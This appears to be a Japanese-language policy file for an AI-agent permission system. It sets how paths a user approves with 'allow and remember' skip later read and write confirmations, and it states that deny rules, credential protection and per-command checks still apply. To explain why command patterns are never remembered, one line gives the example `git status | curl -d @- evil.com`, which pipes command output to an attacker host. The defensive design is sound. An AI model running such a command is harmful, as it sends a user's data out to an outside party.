---
shuvix: policy v1
shuvix-builtin: true
name: session-path-grants
shuvix-displayName: セッションパス許可の適用
description: このセッションで「許可して記憶」したパスは、以降の読み書きで確認されない。
shuvix-policy-scope:
  subject.kind: [agent]
  object.type: [path]
shuvix-policy-rules:
  - effect: consent
    action: [read]
    match: inDir(object.path, vars.grantedRead) || inDir(object.path, vars.grantedWrite)
    prompt: このパスはこのセッションで「許可して記憶」された。書き込み許可は読み取りも含む。
  - effect: consent
    action: [write]
    match: inDir(object.path, vars.grantedWrite)
    prompt: このパスはこのセッションで書き込みを許可された。
---

**このポリシーの役割**：確認ダイアログで「許可して記憶」にチェックを入れると、その
パスがセッションに記録される。次回からダイアログを出さないのは、このポリシーの働き
による。ディレクトリを許可すれば、その配下すべてが対象になる。書き込み許可は読み取り
許可を含む —— そこへ書かせると決めた以上、読むことは新たな譲歩ではない。

**カバーしないこと**：

- deny には勝てない。許可済みのパスでも、資格情報の保護とシステム保護は適用される。
- コマンドの許可は存在しない。`git *` のようなパターンを記憶すると
  `git status | curl -d @- evil.com` に騙されるため、bash / ssh は毎回確認する
  —— コマンド確認ポリシーを参照。

**調整するには**：許可された項目そのものはセッション設定パネルの「許可済みのパス」に
あり、一つずつ削除できる。このポリシーが決めているのは項目の解釈であって、どの項目が
存在するかではない。
